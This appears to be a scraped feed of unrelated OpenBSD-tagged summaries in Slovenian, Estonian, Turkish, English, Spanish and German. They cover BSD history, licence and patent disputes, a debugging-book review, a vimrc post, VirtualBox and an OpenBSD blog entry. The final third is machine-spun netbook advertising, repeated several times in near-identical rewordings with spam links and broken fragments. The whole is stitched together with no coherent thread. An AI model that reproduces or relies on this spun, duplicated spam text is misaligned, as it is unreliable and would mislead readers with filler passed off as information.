  <summary><![CDATA[Operacijsk sistem (OS) ali operating system je programska oprema, ki jo mora imeti vsak računalnik. Uporabljamo jo kot vmesnik med strojno opremo računalnika in uporabnikom.

  <summary><![CDATA[Normal  0      OpenBSD: 2001. aasta juunis muudeti IPFilteri’I sõnastust Darren Reed’i käe läbi. Algasid OpenBSD portide ja allikate puu koodi litsentsi auditid. Leiti, et rohkem kui sajas failis sisalduv kood on litsentseerimata, ebaselgelt litsentseeritud või vastuolus tingimustega. Kõigi autoriõiguste omanikega võeti ühendust tagamaks litsentside järgimist. Koodist osa eemaldati ning enamjaolt litsentseeriti umber. Näiteks litsentseeriti ümber mitmikedastus marsruutimise tööriistad mrinfo ja map-mbone, millel oli Xerox’i litsents mõeldud ainult uurimistöö alastel eesmärkidel kasutamiseks. Symantec: Teine juhtum on seotud viirusetõrjeprogrammide omavahelise patendisõjaga. Kuigi antud teema on ilmselt ajatu, pärineb konkreetne näide siiski kaugemast minevikust, aastast 1997. Symanteci väitel kasutas McAfee nende CrashGuardi koodi oma tollases lipulaevas Virusscan (täpsemalt Pc Medic’us). Kohtuasja “hinnaks” määras Symantec 1 miljard dollarit. Lõpuks võttis Symantec oma sõnad tagasi ning McAfee väljendas, et soovib võistelda konkurentidega turul, mitte kohtusaalis. Väärib tähelepanu, et hagi esitamise päeval McAfee aktsiate 7 %-line langus, samas kui Symantec’i omad suurenesid 5 %.Apple vs Samsung: Mööduva aasta vahest olulisim kohtuvõitlus patentide pärast toimus just 2012 aasta suvel. Apple väitis Samsungit kloonivat oma tooteid, mitte ainult disainivaldkonnas vaid ka tarkvara osas. Võrdluses olid Samsung Galaxy S ja iPhone 3GS telefonid (kusjuures paralleele üritati tuua ka Galaxy Tab’i ja iPad’i vahel, kuid kohus jättis selle nõude rahuldamata).  Samsung vastupidiselt väitis, Apple rikub ja kopeerib nende patente. Kohus määras Apple’le hüvitiseks 1 miljard dollarit ning Samsungi nõudmisi ei rahuldatud.   Viited: 1.  Linux.com.

  <summary><![CDATA[BSD Nedir?

Şöyle ki açık kaynaklı kod dünyasında Linux kelimesi
neredeyse işletim sistemi ile eş anlamlıdır fakat açık kaynak kodlu UNIX ®
sadece Linux değildir.  İnternet İşletim Sistemi Sayacı 'na
göre Nisan 1999 itibarı ile dünyada internete bağlı makinaların %31.3 'ü Linux,
%14.6 'ü ise UNIX 'tir. Yahoo gibi dünyanın en büyük organizasyonlarından biri
BSD kullanmaktadır. Dünyanın en meşgul FTP sunucularından biri olan ftp.cdrom.com günde 1.4 TB dosya
transferi için BSD kullanmaktadır.

Öyleyse sır
nedir? Neden BSD daha iyi bilinmiyor? Bu küçük yazı, bu ve diğer soruların
cevaplarını aramaktadır.

Bu yazıda
BSD ve Linux arasındaki farklar bu şekilde ifade edilecektir.

[ Split HTML
/ Single HTML ]

 

1. BSD nedir?

Öncelikle BSD, Berkeley
Software Distribution'ın kısaltılmışıdır. Bu isim California Üniversitesi,
Berkeley 'in kaynak kodu dağıtımı olan AT&T 'nin UNIX 'i için bir
eklentiler zinciridir. Bir çok açık kaynak kodlu işletim sistemi projesi, 4.4 BSD-Lite
olarak bilinen kaynak kodu dağıtımını temel kabul eder. Ek olarak bunlar,
özellikle GNU projesi olmak üzere diğer bir çok açık kod projesini de kapsar.
BSD 'in içeriği:

BSD çekirdeği işlem zamanlama,
     hafıza yönetimi, simetrik çoklu işlemci(SMP), aygıt sürücüleri ve
     diğerlerini kapsar.


Linux çekirdeğinden farklı olarak kapasite ve güçte
bir çok farklı BSD çekirdeği vardır.

C kütüphanesi, sistem API
     'sinin temellidir


BSD C kütüphanesi GNU projesi tabanlı değildir,
Berkeley kodu temellidir.

Kabuk, dosya araçları
     derleyiciler ve linkerler gibi araçlar.


Bazı araçlar dışında bir çoğu projesinden
sağlanmıştır.

X Windows sistemi grafik ekran
     arabirimi.


Birçok BSD türevinde kullanılan X Window sistemi ayrı
bir proje olan XFree86" projesi
'nde devam ettirilmektdir. Linux 'te bu sistemi kullanmaktadır. BSD KDE ya da
GNOME gibi bir görsel masaüstüile öntanımlı olarak gelmez. Fakat istenirse
bunlar da kullanılabilir.

Bir çok diğer program ve
     araçlar.


 

2. Ne gerçek bir UNIX® 'mi?

BSD işletim
sistemi bir kopya değildir, fakat temelde UNIX 'in atası sayılan AT&T'nin
işletim sisteminin kaynak kodundan oluşur. Ayrıca bu kod System V UNIX 'in de
atasıdır. Bu durum sizi belki şaşırtmış olabilir. Yada AT&T hiç bir zaman
kaynak kodunu vermemiş olmasına rağmen bu nasıl olabilir?

AT&T
UNIX 'inin açık kaynak kodlu olmadığı doğrudur ve kopya hakkı düşünüldüğünde
BSD kesinlikle bir UNIX değildir fakat diğer taraftan AT&T diğer
projelerden ve özellikle Berkeleydeki California Üniversitesi Computer Science
Research Group (CSRG -Bilgisayar Bilimi Araşatırma Grubu)undan AT&T UNIX 'e
bir çok kod dahil ettiği düşünülmelidir. 1976 'dan başlayarak CSRG yazdıkları
yazılımı içeren teyp 'leri dağıtarak bunu Berkeley Software Distribution
ya da BSD olarak nitelendirdi.

BSD ilk
sürümleri asıl olarak kullanıcı programlarından oluşuyordu ta ki dramatik bir
şekilde CSRG karşılılı olarak DARPA (Defence Advanced Projects Research Agency)
ile ağlarındaki (ARPANET) iletişim protokollerini güncellemek için sözleşme
imzalayana kadar. Bu yeni protokol Internet Protokolü daha sonra da TCP/IP
olarak adlandırıldı. BSD nin asıl geniş alanlara yayılmış sürümü 1982 de
piyasaya sürülen 4.2 BSD 'dir.

1980 'lerde
bir çok küçük çaplı işletim sistemi şirketi piyasaya çıktı. Ve birçokları kendi
işletim sistemlerini yazmak yerine UNIX işletim sistemini lisanslamayı tercih
ettiler. Özelde SUN Microsystems 4.2BSD temelli UNIX üzerinde değişiklikler
yaparak SunOS" adıyla lisansladı. AT&T UNIX 'in ticari olarak
satılmasına izin verince, çok kısa bir süre içinde System V adını alacak System
III isimli küçük uygulamalarla satışa başlandı. System V networking uygulama ve
bileşenlerini içermiyordu, bu sebeble piyasaya sürülen bir çok uygulama BSD
'den özellikle ağ teknolojileri alanında TCP/IP protokolünü kullanmaya başladı.
Bunun yanında csh kabuğu ve vi editörünü de kendi sistemlerine
dahil etti. BSD 'den alınan bütün bu eklentilere Berkeley Extensions adı
verildi.

Piyasaya
sunulan BSD kasetleri AT&T kaynak kodu ve gerekli olan olan UNIX lisansını
içeriyordu. 90larda CSRG'a ayrılan fon azalınca grup kapanma ile karşı karşıya
kaldı ve bazı grup üyeleri AT&T 'nin kodunu içermeyen BSD Açık kaynak kod
olarak dağıtılan kodlarını dağıtmaya karar verdi ve bu Networking Tape 2
ya da kısaca Net/2 adı verilen dağıtım ile gerçekleşti. Net/2 tam
anlamıyla bir işletim sistemi değildi çünkü yaklaşık olarak %20 oranındaki
kernel kaynak kodu eksikti. CSRG üyelerinde William F. Jolitz geriye kalan %20
lik kodu yazarak 1992'de 386BSD ismiyle piyasaya sürdü. Aynı zaman zarfında
eski CSRG üyelerinden oluşan bir grup Berkeley
Software Design Inc. adı verilen işletim sisteminin betasını piyasaya
sürdüler ve bu işletim sisteminin adı daha sonra BSD/OS olarak değiştirildi.

386BSD
hiçbir zaman güvenilir bir işletim sistemi olamadı. Onun yerine 1993 yılında
iki ayrı proje doğdu. Bunlar: NetBSD ve
FreeBSD. NetBSD 93'ün başlarında
tamamlandı ancak FreeBSD 'nin ilk versiyonu yılın sonuna kadar hazır durumda
değildi. Bu süre içerisinde kodu devam ettirilmekte güçlük çekilince
karışıklığı önlemek ve yönetimi kolay kılmak için ayrıldı. Projeler farklı
amaçlar gütmeye başladı. 1996 'da NetBSD 'den ayrılarak doğan OpenBSD doğdu.

 

3. BSD neden daha iyi tanınmıyor?

Bir süre yaptığım araştırmaya göre aşağıda sıralayacağım
birçok sebebe bağlı olarak BSD tam olarak bilinmemektedir:

BSD programcıları çoğu zaman
     pazarlama amacı gütmek yerine kendi kodlarını geliştirme ile
     ilgileniyorlar.
Linux 'lerin popülaritesi
     özellikle baskı (ve kitap piyasası) ve şirketlerin desteği linuxlere özel
     destek ve güncellik sağlıyor buna karşılık BSDnin bu şekilde herhangi bir
     destekçisi yoktur. Fakat bu gün geçtikçe değişmektedir.
BSD programcıları Linux
     programcılarından daha tecrübeliler ve işletim sisteminin kullanım
     kolaylığı ile daha az ilgileniyorlar Yeni kullanıcılar Linuxleri daha
     kullanışlı olarak kabul ediyor ve destekliyorlar.
1992, AT&T BSDI 'a dava açtı ve bu yazılımın
     AT&T 'ye ait olan lisanslı kaynak kodunu içerdiğini iddia etti. Dava
     1994'te anlaşma ile sona erdi. Fakat davanın hayaleti insanları avlamaya
     devam etti. Mart 2000'de ise web üzerine, davanın mahkeme tarafından
     geçmişte sonuçlandırıldığınıhaykıran bir makale yayınlandı.


Davanın ortaya çıkardığı önemli bir detayda
isimlendirmeydi. 1980 'lerde BSD aynı zamanda BSD UNIXolarakta bilinmekteydi.
AT&T 'ye ait kodların son kalıntılarının da BSD'den çıkartılması ile
birlikte BSD UNIX adından kurtuldu. Bu sebeble birçok kitapta the 4.3BSD UNIX
operating system ve the 4.4BSD operating systemisimlerini görebilirsiniz.

BSD ile ilgili olarak akılda
     kalan genellikle dağınık ve saldırgan olduğudur. There is a perception
     that the BSD projects are fragmented and belligerent. Wall Street Journal'da bir makalede BSD projelerinin
     balkanülkelerinin ürünü olduğundan bahsedildi. Davada olduğu gibi burada
     da akılda kalan bu tip düşünceler BSD'nin geçmişteki konumu ve durumudur.


 

4. BSD ve Linux nasıl
karşılaştırması

Linux
(mesela Debian Linux) ile BSD arasındaki asıl farklılık nedir? Normal
kullanıcılar için fark aslında çok küçüktür yani ikiside UNIX benzeri işletim
sistemidir. Her ikiside ticari olmayan amaçlar için geliştirildi (Tabiki bu
diğer bazı ticari Linux dağıtımlarındaki gibi değildir). Bu bölümde BSD'nin
yapısına bakıp Linux ile karşılaştıracağız. Genel olarak söylediklerimiz
FreeBSD'ye yakın olacak çünkü yaygın olarak kullanılan BSD versiyonu FreeBSD
'dir.

 

4.1. BSD'nin sahibi kimdir?

BSD tamamen anonimdir yani hiç kimse
veya hiçbir kuruluş BSD'nin sahibi değildir. BSD bütün dünya üzerinde teknik
olarak üst düzeyde ve uzman bir çok insan tarafından geliştirildi. ve BSD'nin
bazı bileşenleri farklı açık kaynak kodu geliştiricileri tarafından sağlandı.

 

4.2. BSD nasıl geliştirildi ve
güncellendi?

BSD
çekirdeği Açık kaynak geliştirim modeli ile geliştirilmiştir. Her proje erişimi
herkese açık olan kaynak kodu ağacı altında Concurrent Versions System (CVS) ile dağıtıldı. Bu sistemde BSD ile
alakalı doküman ve diğer dosyalar da bulunmaktadır. CVS ile herhangi bir kişi
check out(yani gerekli dosyaların bir kopyasını sistemine indirerek) yaparak
sistemin herhangi bir bolümüne sahip olabilmektedir.

Dünya
üzerinde odukça fazla sayıda programcı BSD'nin gelişimine katkıda bulunur. Bu
programcı ve geliştiriciler temelde üç kısma ayrılır:

Contributors(Katkıta
     Bulunanlar)
     doküman ya da kod yazarlar. Bu grubun direk olarak kod ağacına herhangi
     bir kod eklenmelerine izin verilmez. Bu kişilerin yazdığı kodlar committer
     tarafından incelenip ana sistemde dahil edilirler.
Committers kaynak ağacına kod ekleme
     yetkisinde sahip geliştiriciler. Committer olabilmek için çalıştığı alan
     üzerinde çok yüksek bilgi seviyesine sahip olması gerekir.


Bazı commiterler bütün kaynak koduna ulaşma yetkisine
sahiptirler diğerleri ise gerçek koddan ayrı tutulurlar. Dökümantasyonla
ilgilenenler normal olarak kernel koduna ulaşma yetkisine sahip değillerdir.
Principal Architect olarak adlandırılan çekirdek takımındaki bazı şahısların
ise back out adı verilen kaynak kodu ağacındaki kodları silme hakkı
vardır. Bütün committer 'lar yapılan her bir commit (işlem) için e-posta
alırlar ve böylece gizlice bir kodun kaynak kodu ağacına girmesi engellenmiş
olur.

Core team (Çekirdek Takımı). FreeBSD ve NetBSD kesinlikle
     bir çekirdek takıma sahiptir. Çekirdek takım projenin gelişimi ve
     oluşturulması sırasında programlarını yaparlar ve rolleri tam olarak belli
     değildir. Çekirdek takımı üyesi olmak için program geliştirici (developer)
     olma zorunluluğu yoktur ve buda son derece normaldir. Çekirdek takım için
     kurallar bir projeden diğerine farklılık gösterebilir ve genel olarak
     çekirdek takımın projenin gelişme ve gidişat noktasındaki görüş ve
     fikirleri kesinlikle Çekirdek Takım üyesi olmayan kişilerin görüş ve
     fikirlerinden daha üstün tutulur.


Işte bütün
bu düzenlemeler Linux'ten birçok noktada farklılık gösterir:

Hiç kimse sistem içeriğini
     kontrol edemez. Pratikte bu farklılık göze çok önemli gelebilir. Asıl
     mimar (Chief Architect) kodun asıl koddan çıkartılması isteğinde
     bulunabilir ve hatta Linux projelerinde birçok kişi değişiklikler
     yapabilir.
Diğer taraftan merkezi bir depo
     vardır. Bu depo eski tüm versiyonlarda dahil olmak üzere bir noktada
     toplanmış olarak işletim sistemine ait tüm kodları barındırır.
BSD projeleri yalnızca
     kernel(çekirdek) olarak değil bütün işletim sistemiolarak kabul edilir. Bu
     özellik yalnızca marjinal olarak faydalıdır. Ne BSD nede Linux programlar
     olmadan yararlı değildir. Ve bu programlar Linux altında BSD altında
     kullanıldığı gibi kullanılır.
CVS kod ağacının (source tree)
     biçimlendirilmiş olmasının bir neticesi olarak BSD gelişim evreleri gayet
     açıktır ve herhangi bir versiyona ait bilgi versiyon numarası yada
     piyasaya sürülme tarihi ile bulunabilir. Hatta CVS güncellemelere izin
     bile verir. Örneğin FreeBSD deposu ortalama günde 100 kez güncellenir
     ancak bu güncellemeler çoğu kez çok küçüktür.

Check out the link below:  >> Click Here to See Compare Prices and Get the Best Offers Hacker Debugging Uncovered (Uncovered series) ReviewFirst, a word about the publisher, A-List. This book was delayed time and time again. So much so that I had this book preordered for over a year. This sort of thing is just unacceptable, and would make me inclined to not purchase any books from this publisher in the future, and some of the rating I gave it is because of the publisher. This book has a much larger unix focus than the 'Hacker Disassembling Uncovered' which was largely windows based, however the author's relative unfamiliarity with unix tends to show. For example, on page 39 the author states: IDA Pro, the best disassembler of all times, is nw available under Linux! Users of FreeBSD and other operating systems will have to be content with the console Windows version started under the emulator or have to work on native MS-DOS, OS/2, and Windows. Unfortunately, the author does not mention (or does not know?) that the OS2 and DOS4GW products were discontinued when the linux version was released. Additionally, FreeBSD (and OpenBSD and NetBSD) can easily run linux binaries by mapping the system calls. It's a very cheap way to run linux binaries, and it was acomplished for OpenBSD within a day or so of the 4.7 release. A much cleaner way is available now; others have managed to do the same for FreeBSD, and NetBSD is likely to be straihtforward as well. There's also some problems with the book that confuse me. For example, on page 432 the author states the following:The C programming language doesn't allow you to declare functions returning pointers to functions, because this declaration is recursively looped. I simply do not know where he pulled this from. The following small C example demonstrates how to do just this: #include  int (*HelloWorld(void))(int,int); int helloworld(int a, int b) { printf("hello world: %d %d\n", a, b); return 0; } int main(void) { int (*foo)(int, int) = HelloWorld(); foo(1,2); return 0; } int (*HelloWorld(void))(int, int) { return helloworld; } And here is it being compiled: brian@lemon:~> gcc -ansi -std=c89 -Wall -o foo foo.c brian@lemon:~> and here is it being run: brian@lemon:~> ./foo hello world: 1 2 brian@lemon:~> On to the actual content of the book, it's largely okay. However, if you are expecting new antidebugging ideas, or even ideas hackers are actually going to use, you are in for a rather unfortunate surprise. When I purchased this book, I sort of expected it would keep the duplication from Hacker Disassembling Uncovered to a minimum, but I found that the amount of the book dedicated to static analysis (ie: disassembling and the line) is significant. Far more significant than it should be; nearly the first half of the book is filled with static analysis stuff, working on straightforward crackmes (similar to the previous book in the series), and so forth. This strikes me as fluff in order to boost the price the publisher can charge. Once you get past these negative parts, you have an okay book about (mostly) antidebugging techniques, and some debugging techniques. There's also the requisite PE injection section (sorry, no elf version) along with some basic PE documentation (also no elf version of this). There's quite a bit here if you want a broad ovrview of binary analysis using both static and dynamic analysis. There's nothing new here at all, but if you'd like a bunch of things all in one place, this book may be useful, dispite its many flaws.Hacker Debugging Uncovered (Uncovered series) OverviewTips for the practical use of debuggers, such as NuMega SoftIce, Microsoft Visual Studio Debugger, and Microsoft Kernel Debugger, with minimum binding to a specific environment are disclosed in this debugger guide. How debuggers operate and how to overcome obstacles and repair debuggers is demonstrated. Programmers will learn how to look at what is inside a computer system, how to reconstruct the operating algorithm of a program distributed without source code, how to modify the program, and how to debug drivers.

  <title><![CDATA[Optimized Vimrc with 256 Colorscheme]]></title>
  <summary><![CDATA[AskApache.com This is 90% geared for purely console/terminal/pty/tty/ssh/putty/telnet/tmux/screen users.  I've only just the past couple years started understanding why it was key to learn vim, in the past I never had the patience for it and preferred nano-like editors.  Now vim is all I use when on linux, it's so much more productive.. especially with a customized vimrc file.  This doesn't require a git checkout, a vim update, a bash update, an OS update, a plugin.  No.  This is a single file that I use on Arch Linux, NetBSD, FreeBSD, OpenBSD, Debian, Ubuntu, Cent OS, Red Hat, and that's it so far.  This is geared for users who use SSH more than anything else.  Of course, it works perfect on an X enabled box locally as well. 

ScreenShot
 

Setup
I install this as /etc/vimrc if possible.  Individual users can use a vim config file in their home directories. 
source /etc/vimrc
To install for a single user just save it in their home dir at /home/username/.vimrc 

Portability
For the portability needed to work on many different systems, this doesn't rely on any plugins other than those built into the default installation of vim 7.0.
It works well on all types of consoles, and depending on the TERM environment variable (and whether it has the right term capabilities) it will load 256 color support or not.  Usually on a new system I just scp this right over and it works without any modifications.  But an ongoing Work in progress.

Colorscheme
Here is a colorscheme file optimized for 256 colors.  It will work if saved in ~/.vim/colors/askapachecode.vim or likewise in your runtimepath.  Additionally, you could just paste it in the bottom of the above vimrc.  The code really needs to be cleaned up, but it looks awesome.

  <title><![CDATA[Descargar VirtualBox 4.2.6 gratis]]></title>
  <summary><![CDATA[VirtualBox es un programa de virtualización o emulación, que permite tener una máquina virtual en el PC, con la posibilidad de instalar dentro de Windows otro sistema operativo; por ejemplo, si se tiene instalado Windows XP como sistema operativo se puede correr virtualmente el Windows 8 o 7, o alguna distribución de Linux, y también a la inversa: desde Linux correr Windows, o el resto de las combinaciones posibles entre los diferentes sistemas operativos soportados. 
Las funciones y ventajas de contar con una máquina virtual son muchas, por ejemplo para aquellos que utilizan Linux probar nuevas distribuciones, o correr algún programa de Windows al que están habituados, pero que no es compatible con Linux. Lo mismo a la inversa: para aquellos usuarios que utilizan Windows y empiezan sus primeros pasos en Linux pueden probarlo, sin necesidad de crear otra partición, ni instalarlo, ni usar GRUB. 
VirtualBox también es útil para probar aplicaciones sin correr el riesgo de dañar el sistema operativo, por ejemplo: archivos que se sospecha que pueden contener virus; y es también útil para desarrolladores que deben testear sus aplicaciones en diferentes sistemas operativos. 
Los sistemas operativos soportados por VirtualBox son: DOS/Windows 3.x, Windows NT, Windows 2000, Windows XP, Windows Server 2003, Windows Vista, Windows 7, Windows 8, Linux 2.4, Linux 2.6, OS/2 Warp y OpenBSD entre otros; y ahora también Mac OS X. (10.6, 10.7, 10.8). 
Virtual Box compite con otro programa de las mismas características que es el VmWare, pero VirtualBox tiene la ventaja de ser más liviano, completamente gratis, y además GNU (código abierto). 
VirtualBox 4.2.6 es la última versión de este software, actualizada en diciembre de 2012. 
Se encuentra disponible para descargar un completo y detallado manual de usuario, desde el sitio oficial del proyecto VirtualBox.

  <summary><![CDATA[Huch, schon wieder ein Monat vergangen ohne einen einzigen Blogeintrag verfasst zu haben. Sprechen wir doch mal über Betriebssysteme. Seit Jahren bin ich leidenschaftlicher Linux-Verfechter, doch bin ich vor einigen Wochen über eine Aussage von Theo de Raadt gestolpert, seines Zeichens Chef und Alleinherrscher über das OpenBSD Projekt, von ihm gegründet und vorangetrieben, ein Mann mit einer klaren Vorstellung, wie ein Unix-Betriebssystem auszusehen hat (einfach und elegant), ist er eine äusserst polarisierende Person, weil ausgesprochen radikal und eigenwillig, schroff, rabiat und unnahbar, dem aber selbst seine schärfsten Kritiker, derer es viele gibt, ein hohes Mass an technischem Verständnis attestieren, dieser Theo de Raadt also, der nicht müde wird zu behaupten, dass Linux ein Haufen Schrott ist, sprach folgenden Gedanken aus: Linux ist allein aus Hass gegen Microsoft entstanden. OpenBSD hingegen wird aus Liebe zu Unix entwickelt. Und jetzt Achtung: Liebe > Hass. Deshalb ist OpenBSD besser als Linux. Nun, ich habe OpenBSD in einer VirtualBox installiert und ich muss sagen: es hat was. Unix wie vor 30 Jahren, bescheiden, ehrlich, demütig, nichts da mit dem neumodischen Schnickschnack (Fenster zum rumklicken usw.). Shell, vim, fertig. So muss es ein. OpenBSD wird zwar eher für Server, Firewalls und Embedded Systems eingesetzt, aber ich werde die Desktop-Lösung weiterverfolgen. Da kannst du deine Treiber noch selber schreiben. Ein Betriebssystem für Leute, die wissen wollen, was die Rechenmaschine im Innersten zusammenhält. 
Ein typisches De Raadt Zitat, das seine Gedankenwelt auf den Punkt bringt: 
The world doesn’t live off jam and fancy perfumes – it lives off bread and meat and potatoes. Nothing changes. All the big fancy stuff is sloppy stuff that crashes. I don’t need dancing baloney – I need stuff that works. That’s not as pretty, and just as hard.

  <summary><![CDATA[Linda asks… 


Is anyone here familiar with the software industry and its key players?
Like Hitachi Data Systems, Sap, salesforce.com, net appliance? 
1.Hitachi Data Systems introduced a downgraded storage controller that targets SMBs that cannot afford the high price tag of Hitachi‘s SAN and have partnered with Ingram Micron to reach the SMB market of Asia. What other tactics can be used by Hitachi to capture this segment? 
2.What effect will this have on the market share of its higher-priced products? 
3.What form of response from its competitors does the company expect and how are they preparing for it? 
•Where does NetApps see the storage software market moving in the near future? How does it see itself in this new market? What are the major opportunities that it would be pursuing? 
•What would be NetApps move for or against open source and how will it affect its business strategies? 
•How has the company been affected by the publicity surrounding the lawsuit? 



HDR Staff answers:
So you need help with a research paper? 
The key players in software are not these people. I ahte to say. 
It’s Torvalds, De Raadt, Murdock, Tannenbaum, Ritchie, The FSF, Microsoft’s research division.  You are talking about hardware issues. 
I’ll explain software to you: 
I have an application that I built on a SPARC using  OpenBSD. I want it to run on anARm, i86, and AMD64 that will use Windows, Linux, and FreeBSD. 
It will be ported to FreeBSD. 
I will have to port this to NetBSD and buiold it to run off of all listed processor types. Then I will have to build it- or rebuild- to run on Linux and Windows by creating a source code and the build files. 
File sharing has to do with the kernel.

Netbooks are extremely light, small-sized laptop computers that are mainly employed for browsing the net, shopping online, chatting and using the social networking sites. Most of the sites offering netbook reviews speak highly about the subject and they are becoming more and more popular. Mostly, this happened due to a series of advantages that attracted the public right away: 
 
Advantage no.1: Size 
The small-sized netbook is definitely good to go anywhere you go. You can put it inside your office briefcase, inside your backpack when you go on a holiday or in a bag, if you wish to go for a walk. Practically, they fit anywhere, thanks to its special design, with a 7 to 12 inch screen, that can take up little room, but gives you top quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can carry it around without feeling you're actually carrying weight. It is light enough to be carried by children, by old people and through those who usually have many and/or heavy thing in it and want an easy computer. 
 
Advantage no. 3: Battery 
As it is created for people who mainly browse the web, battery is 3-4 cells or perhaps 6 cells, on the newest models, so as to stay connected for up to 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you regularly find a pc: Windows, Linux, Google Chrome OS, Mac OS X yet others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://me.quangbinh24h.com/blogs/viewstory/14636 find netbooks]  
 
Advantage no. 5: Storage 
Equipped with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you want while browsing the web. 
 
Advantage no. 6: Keyboard 
Being no more than it is, the netbook raises the keyboard issue: Could it be cramped? Will it slow down your progress? The fact is that, at the beginning, the laptop keyboard was nearly 80% of the laptop keyboard also it made a few difficulties in typing. You can now discover the improved models available on the market, with bigger keyboards, which are 92% of a regular laptop's and permit you to type fast and easily. 
 
Advantage no. 7: Price 
Last, although not least, one of the main advantages the netbook provides is its low price. Judging by the quality it provides, it is a great deal for just about any user. 
 
So, with all of these pluses, there's no wonder netbook reviews just praise these little gadgets. As well as there's no wonder increasing numbers of people are trading their every single day laptop for any smaller, cheaper, better netbook, don't you think?]]></summary>

Netbooks are extremely light, small-sized laptop computers which are mainly employed for browsing the net, shopping on the web, chatting and taking advantage of the social networks. Most of the sites offering netbook reviews speak highly about the subject and they are becoming more and more popular. Mostly, this happened due to a number of advantages that attracted the general public immediately: 
 
Advantage no.1: Size 
The small-sized netbook is definitely good to go where you go. Place it in your office briefcase, in your backpack when you go on a holiday or perhaps in a bag, if you wish to go for a walk. Practically, it fits anywhere, because of its special design, with a 7 to 12 inch screen, that takes up little room, but gives you good quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can transport it around without feeling you're actually carrying weight. It is light enough to become carried by children, by old people and also by those who will often have many and/or heavy thing on them and need an easy computer. 
 
Advantage no. 3: Battery 
Because it is designed for individuals who mainly see the web, battery is 3-4 cells or even 6 cells, on the newest models, in order to stay connected for approximately 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you frequently find a pc: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin.

Advantage no. 5: Storage 
Designed with a 2.5 ", 5400 SATA drive, the netbook enables you to save data you want while browsing the net. 
 
Advantage no. 6: Keyboard 
Being as small as it is, the netbook enhances the keyboard issue: Is it cramped? Does it slow down your progress? The truth is that, at the beginning, the keyboard was nearly 80% of the laptop keyboard also it created a few difficulties in typing. Now you can discover the improved models available on the market, with bigger keyboards, which are 92% of the regular laptop's and allow you to definitely type fast and easily. 
 
Advantage no. 7: Price 
Last, although not least, one of many advantages the netbook has to offer is its low price. Judging by the quality it provides, it's a good deal for just about any user. 
 
So, with all of these pluses, there's no wonder netbook reviews just praise these little gadgets. As well as there is no wonder more and more people are trading their every single day laptop for any smaller, cheaper, better netbook, don't you think?]]></summary>

Netbooks are very light, small-sized laptops that are mainly used for browsing the web, shopping online, chatting and taking advantage of the social networking sites. Many of the sites offering netbook reviews speak highly about them and they are becoming a lot more popular. Mostly, this happened due to a series of advantages that attracted the general public right away: 
 
Advantage no.1: Size 
The small-sized netbook is always all set anywhere you go. Place it inside your office briefcase, in your backpack when you go on a journey or perhaps in a bag, if you want to go for a walk. Practically, it fits anywhere, because of its special design, with a 7 to 12 inch screen, that takes up little room, but gives you top quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can transport it around without feeling you're actually carrying weight. It's light enough to become carried by children, by old people and also by the ones who will often have many and/or heavy thing in it and want a light computer. 
 
Advantage no. 3: Battery 
As it is designed for people who mainly see the web, the battery is 3-4 cells or even 6 cells, on the newest models, so as to stay connected for up to 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you regularly look for a pc: Windows, Linux, Google Chrome OS, Mac OS X yet others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://friendzspace.tk/blogs/viewstory/204 find netbooks]  
 
Advantage no. 5: Storage 
Equipped with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you would like while browsing the web. 
 
Advantage no. 6: Keyboard 
Being no more than it is, the netbook enhances the keyboard issue: Is it cramped? Will it slow you down? The truth is that, at the beginning, the laptop keyboard was nearly 80% of the laptop keyboard also it made a few difficulties in typing. You can now find the improved models on the market, with bigger keyboards, which are 92% of the regular laptop's and allow you to type fast and simply. 
 
Advantage no. 7: Price 
Last, but not least, one of many advantages that the netbook provides is its low price. By the quality it offers, it's a good deal for just about any user. 
 
So, with all these pluses, there is no wonder netbook reviews just praise these little gadgets. And also there's no wonder increasing numbers of people are trading their every single day laptop for a smaller, cheaper, better netbook, no?]]></summary>

Being as small as it's, the netbook raises the keyboard issue: Is it cramped? Does it slow you down? The truth is that, at the start, the laptop keyboard was nearly 80% of a laptop keyboard and it made a few difficulties in typing. Now you can discover the improved models on the market, with bigger keyboards, which are 92% of a regular laptop's and allow you to definitely type fast and easily. 
 
Advantage no. 7: Price 
Last, but not least, one of many advantages the netbook provides is its low price. Judging by the quality it provides, it is a good deal for just about any user. 
 
So, with all these pluses, there is no wonder netbook reviews just praise these little gadgets. And also there's no wonder more and more people are trading their every single day laptop for a smaller, cheaper, better netbook, no?]]></summary>

Advantage no. 5: Storage 
Equipped with a 2.5 ", 5400 SATA drive, the netbook enables you to save data you would like while browsing the net. 
 
Advantage no. 6: Keyboard 
Being no more than it's, the netbook raises the keyboard issue: Could it be cramped? Will it slow down your progress? The fact is that, at the start, the laptop keyboard was nearly 80% of the laptop keyboard and it made a few difficulties in typing. You can now find the improved models available on the market, with bigger keyboards, which are 92% of a regular laptop's and allow you to definitely type fast and easily.

Netbooks are very light, small-sized laptops which are mainly used for browsing the net, shopping on the web, chatting and taking advantage of the social networks. Most of the sites offering netbook reviews speak highly about the subject and they are becoming a lot more popular. Mostly, this happened because of a series of advantages that attracted the general public right away: 
 
Advantage no.1: Size 
The small-sized netbook is always good to go anywhere you go. Place it in your office briefcase, in your backpack when you go on a holiday or in a bag, if you wish to go for a walk. Practically, it fits anywhere, because of its special design, with a 7 to 12 inch screen, that can take up little room, but gives you top quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can carry it around without feeling you're actually carrying weight. It is light enough to become carried by children, by old people and also by those who usually have many and/or heavy thing on them and need an easy computer. 
 
Advantage no. 3: Battery 
Because it is created for people who mainly browse the web, battery is 3-4 cells or perhaps 6 cells, around the newest models, so as to keep in touch for approximately 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you regularly look for a pc: Windows, Linux, Google Chrome OS, Mac OS X yet others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://social.gamesarrival.com/blogs/viewstory/2706 netbooks]  
 
Advantage no. 5: Storage 
